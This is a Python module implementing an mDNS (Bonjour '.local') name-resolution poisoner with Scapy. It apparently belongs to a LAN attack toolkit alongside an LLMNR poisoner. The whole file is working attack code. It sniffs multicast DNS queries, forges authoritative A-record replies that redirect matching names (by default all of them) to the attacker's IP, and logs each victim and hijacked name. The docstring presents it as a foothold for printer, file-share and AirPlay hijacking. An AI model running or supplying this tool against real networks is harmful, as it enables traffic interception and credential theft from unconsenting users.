"""
mdns_spoofer.py — Apple-Bonjour ``.local`` name hijacker.

Multicast DNS (RFC 6762) is the name-resolution protocol Apple,
Linux Avahi, and most IoT devices use for ``hostname.local`` lookups.
Unlike LLMNR (Windows) it operates on UDP 5353 / multicast
224.0.0.251 — and like LLMNR it is unauthenticated, so any host on
the link can answer.

When a victim resolves ``printer.local`` (for example), we win the
race with a unicast A-record response pointing at our IP. The victim
then "talks to us" instead of the real ``.local`` host — the classic
foothold for AirPlay / file-share / printer hijacking demos.

The module is the Apple/Linux counterpart to ``llmnr_poisoner.py``;
together they cover most LAN name-resolution surfaces.

Educational note: macOS / iOS will only accept an answer originating
from someone on the same link, so this attack is a same-LAN-only
demonstration.

Fail-soft when Scapy is unavailable.
"""

from __future__ import annotations

import collections
import fnmatch
import re
import threading
import time
from typing import Optional

try:
    from scapy.all import sniff, send  # type: ignore
    from scapy.layers.dns import DNS, DNSQR, DNSRR  # type: ignore
    from scapy.layers.inet import IP, UDP  # type: ignore

    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False


MDNS_PORT = 5353
MDNS_MCAST_V4 = "224.0.0.251"


def _matches_pattern(qname: str, pattern: str) -> bool:
    """Case-insensitive substring or fnmatch wildcard match for ``.local`` names."""
    qname = qname.lower().rstrip(".")
    pattern = pattern.lower().strip().rstrip(".")
    if not (qname and pattern):
        return False
    if "*" in pattern or "?" in pattern:
        return fnmatch.fnmatchcase(qname, pattern)
    return pattern in qname or qname == pattern


class MDNSSpoofer:
    """Answer mDNS A-record queries that match user-supplied patterns.

    Parameters
    ----------
    iface:
        Interface to sniff/send on.
    answer_ip:
        IPv4 address embedded in forged responses (typically the
        attacker's own IP).
    patterns:
        List of name patterns to answer for. Use ``*`` to match every
        ``.local`` query, or a specific name like ``printer.local`` /
        ``*-printer.local``.
    exclude_names:
        Names that must never be poisoned (e.g. the attacker's own
        hostname so we don't redirect ourselves).
    """

    HIT_LIMIT = 500

    def __init__(
        self,
        iface: Optional[str],
        answer_ip: str,
        patterns: Optional[list[str]] = None,
        exclude_names: Optional[set[str]] = None,
    ) -> None:
        self.iface = iface
        self.answer_ip = answer_ip
        self.patterns: list[str] = [
            p.strip() for p in (patterns or ["*"]) if p and p.strip()
        ]
        self.exclude_names = {n.lower().strip() for n in (exclude_names or set())}
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.hits: int = 0
        self.recent_hits: collections.deque = collections.deque(
            maxlen=self.HIT_LIMIT,
        )
        self.started_at: float = 0.0

    # ------------------------------------------------------------------ #

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.started_at if self.started_at else 0.0

    def start(self) -> None:
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for mDNS spoofer.")
        if not self.answer_ip:
            raise RuntimeError("mDNS spoofer needs an answer_ip.")
        if not self.patterns:
            raise RuntimeError("mDNS spoofer needs at least one pattern.")
        if self.is_running:
            return
        self._stop_event.clear()
        self.started_at = time.time()
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "running":     self.is_running,
                "uptime":      self.uptime_seconds,
                "answer_ip":   self.answer_ip,
                "patterns":    list(self.patterns),
                "hits":        self.hits,
                "recent_hits": list(self.recent_hits),
            }

    # ------------------------------------------------------------------ #

    def _matches(self, qname: str) -> bool:
        for pat in self.patterns:
            if _matches_pattern(qname, pat):
                return True
        return False

    def _sniff_loop(self) -> None:
        bpf = f"udp port {MDNS_PORT}"
        try:
            sniff(
                iface=self.iface,
                filter=bpf,
                prn=self._on_packet,
                store=False,
                stop_filter=lambda _p: self._stop_event.is_set(),
            )
        except Exception:
            pass

    def _on_packet(self, packet) -> None:
        try:
            if not (packet.haslayer(IP) and packet.haslayer(UDP)
                    and packet.haslayer(DNS)):
                return
            src_ip = packet[IP].src
            if src_ip == self.answer_ip:
                return                      # don't poison ourselves
            dns = packet[DNS]
            if dns.qr != 0 or dns.qdcount < 1 or not packet.haslayer(DNSQR):
                return
            qd = packet[DNSQR]
            qtype = int(qd.qtype)
            if qtype != 1:                  # only A records
                return
            qname_raw = qd.qname
            qname = (
                qname_raw.decode("utf-8", errors="replace")
                if isinstance(qname_raw, bytes) else str(qname_raw)
            ).rstrip(".")
            if not qname or qname.lower() in self.exclude_names:
                return
            if not self._matches(qname):
                return

            # mDNS replies go back to the querier as unicast — modern
            # mDNS responders set the QU bit so direct unicast is OK.
            src_port = int(packet[UDP].sport)
            response = (
                IP(src=self.answer_ip, dst=src_ip)
                / UDP(sport=MDNS_PORT, dport=src_port)
                / DNS(
                    id=dns.id, qr=1, aa=1, qd=dns.qd,
                    an=DNSRR(rrname=qd.qname, ttl=60,
                             rdata=self.answer_ip, type="A"),
                )
            )
            try:
                send(response, iface=self.iface, verbose=0)
            except Exception:
                return

            with self._lock:
                self.hits += 1
                self.recent_hits.append({
                    "ts":     time.time(),
                    "victim": src_ip,
                    "name":   qname,
                })
        except Exception:
            pass
